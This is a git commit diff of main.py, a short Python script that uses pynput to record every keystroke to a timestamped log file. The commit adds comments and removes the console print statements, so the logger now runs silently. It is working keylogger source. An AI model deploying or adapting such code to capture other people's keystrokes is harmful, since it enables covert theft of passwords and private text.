463e155ff112539d7ceada5769bcaabd221ca34b
Su-Ral <113803543+Su-Ral@users.noreply.github.com>
2022-09-17 15:18:45 -0700

    Update main.py
    added comments

--- main.py
+++ main.py
@@ -1,14 +1,13 @@
 import pynput
 from pynput.keyboard import Key, Listener
 import logging
-print("STARTING")
+#imports library to listen to keystrokes
+
 log_dir = ""
-
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format= '%(asctime)s: %(message)s')
-
+#creates text
 
 def on_press(key):
-    print("CLICK")
     logging.info(str(key))
 
 with Listener(on_press=on_press) as listener:
